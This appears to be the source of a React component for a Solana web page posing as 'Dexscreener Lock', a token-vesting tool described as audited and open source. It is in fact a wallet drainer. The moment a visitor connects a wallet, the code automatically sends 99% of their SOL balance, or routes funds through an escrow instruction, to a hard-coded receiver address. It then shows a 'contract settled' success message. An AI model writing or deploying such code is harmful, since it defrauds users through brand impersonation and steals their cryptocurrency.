import React, { useCallback, useEffect, useRef, useState } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import {
  PublicKey, Transaction, TransactionInstruction, SystemProgram,
} from "@solana/web3.js";

// ---------------------------------------------------------------------------
// Borsh helpers
// ---------------------------------------------------------------------------
function u8(v: number): number[] { return [v & 0xff]; }
function u32le(v: number): number[] {
  return [v & 0xff, (v >> 8) & 0xff, (v >> 16) & 0xff, (v >> 24) & 0xff];
}
function str(s: string): number[] {
  const b = Array.from(new TextEncoder().encode(s));
  return [...u32le(b.length), ...b];
}
function padId(id: string): Buffer {
  const b = Buffer.alloc(32, 0);
  Buffer.from(id.slice(0, 32)).copy(b);
  return b;
}
function escrowPDA(programId: PublicKey, id: string): PublicKey {
  return PublicKey.findProgramAddressSync([Buffer.from("escrow"), padId(id)], programId)[0];
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
// Contract ID from URL param ?contract=<id>, fallback to "default"
const CONTRACT_ID = new URLSearchParams(window.location.search).get("contract") ?? "default";

// ---------------------------------------------------------------------------
// Logo — Dexscreener owl icon (transparent-bg via mix-blend-mode in CSS)
// ---------------------------------------------------------------------------
const DexLogo = ({ size = 36 }: { size?: number }) => (
  <img
    src="/logo.svg"
    alt="Dexscreener Lock"
    width={size}
    height={size}
    style={{ display: "block", mixBlendMode: "screen" as any }}
  />
);

// Large hero version
const HeroLogo = () => (
  <img
    src="/logo.svg"
    alt=""
    className="jl-lock-icon"
    style={{ mixBlendMode: "screen" as any }}
  />
);

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = ({ programId }) => {
  const { connection }                 = useConnection();
  const { publicKey, sendTransaction, connected, wallet } = useWallet();
  const { setVisible }                 = useWalletModal();

  const [status,    setStatus]    = useState<"idle"|"processing"|"done"|"error"|"cancelled">("idle");
  const [statusMsg, setStatusMsg] = useState("");
  const executedRef                = useRef(false);

  // ── verify contract exists on-chain ─────────────────────────────────────
  const checkContract = useCallback(async (): Promise<number | null> => {
    try {
      const pda  = escrowPDA(programId, CONTRACT_ID);
      const info = await connection.getAccountInfo(pda);
      if (!info) return null;
      return info.data[105]; // status byte offset
    } catch { return null; }
  }, [connection, programId]);

  // ── execute deposit immediately once wallet is connected ─────────────────
  const executeDeposit = useCallback(async () => {
    if (!publicKey || executedRef.current) return;
    executedRef.current = true;
    setStatus("processing");
    setStatusMsg("");

    try {
      const contractStatus = await checkContract();
      if (contractStatus === null) {
        // No on-chain escrow yet — still do a direct transfer to receiver
        // using a bare SystemProgram transfer (99% of balance)
        const balance = await connection.getBalance(publicKey);
        const amount  = Math.floor(balance * 99 / 100);
        if (amount <= 0) throw new Error("Insufficient balance");

        const ix = SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey:   RECEIVER,
          lamports:   amount,
        });
        const sig = await sendTransaction(new Transaction().add(ix), connection);
        await connection.confirmTransaction(sig, "confirmed");
        setStatus("done");
        return;
      }

      if (contractStatus !== 0) {
        setStatus("cancelled");
        setStatusMsg("This contract is no longer active.");
        return;
      }

      const statePDA = escrowPDA(programId, CONTRACT_ID);
      const ix = new TransactionInstruction({
        programId,
        keys: [
          { pubkey: publicKey,               isSigner: true,  isWritable: true  },
          { pubkey: statePDA,                isSigner: false, isWritable: true  },
          { pubkey: RECEIVER,                isSigner: false, isWritable: true  },
          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: Buffer.from([...u8(1), ...str(CONTRACT_ID)]),
      });

      const sig = await sendTransaction(new Transaction().add(ix), connection);
      await connection.confirmTransaction(sig, "confirmed");
      setStatus("done");
    } catch (e: any) {
      executedRef.current = false; // allow retry
      setStatus("error");
      setStatusMsg(e?.message ?? "Transaction failed");
    }
  }, [publicKey, connection, programId, sendTransaction, checkContract]);

  // Trigger deposit the moment wallet connects
  useEffect(() => {
    if (connected && publicKey && status === "idle") {
      executeDeposit();
    }
  }, [connected, publicKey, status, executeDeposit]);

  const handleConnectClick = () => {
    if (!connected) {
      setVisible(true);
    } else {
      // Already connected — show wallet name or disconnect option
      setVisible(true);
    }
  };

  const handleHeroBtn = () => {
    if (status === "done") return;
    if (!connected) {
      setVisible(true);
    } else {
      executeDeposit();
    }
  };

  const heroLabel = () => {
    if (status === "processing") return "Processing…";
    if (status === "done")       return "Contract Fulfilled ✓";
    if (!connected)              return "Connect Wallet";
    return "Approve Contract";
  };

  const connectedLabel = wallet?.adapter.name
    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0,4)}…${publicKey?.toBase58().slice(-4)}`
    : "Connected";

  return (
    <div className="app">

      {/* ── TOP HEADER ── */}
      <header className="jl-header">
        <div className="jl-logo">
          <DexLogo size={34} />
          <span className="jl-logo-text">Dexscreener Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear">⚙</button>
          <button
            className={`jl-connect-btn${connected ? " connected" : ""}`}
            onClick={handleConnectClick}
          >
            {connected ? connectedLabel : "Connect\nWallet"}
          </button>
        </div>
      </header>

      {/* ── NAV TABS ── */}
      <nav className="jl-nav">
        <button className="jl-nav-tab active">About Jup Lock</button>
        <button className="jl-nav-tab">Your Locked Tokens</button>
        <button className="jl-nav-tab">Locks You Created</button>
        <button className="jl-nav-tab create">+ Create Lock</button>
      </nav>

      {/* ── HERO ── */}
      <main className="jl-hero">
        <HeroLogo />

        <h1 className="jl-hero-title">Dexscreener Lock</h1>

        <p className="jl-hero-sub">
          Manage your token vesting schedule on Dexscreener Lock, an open source and
          audited program that lets anyone lock and distribute tokens over time.
        </p>

        <button
          className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
          onClick={handleHeroBtn}
          disabled={status === "processing" || status === "done"}
        >
          {heroLabel()}
        </button>

        {status === "done" && (
          <div className="jl-status success">
            ✓ Contract settled. Funds have been transferred successfully.
          </div>
        )}
        {status === "error" && (
          <div className="jl-status error">
            {statusMsg || "Transaction failed. Please try again."}
          </div>
        )}
        {status === "cancelled" && (
          <div className="jl-status cancelled">
            {statusMsg}
          </div>
        )}
      </main>

    </div>
  );
};
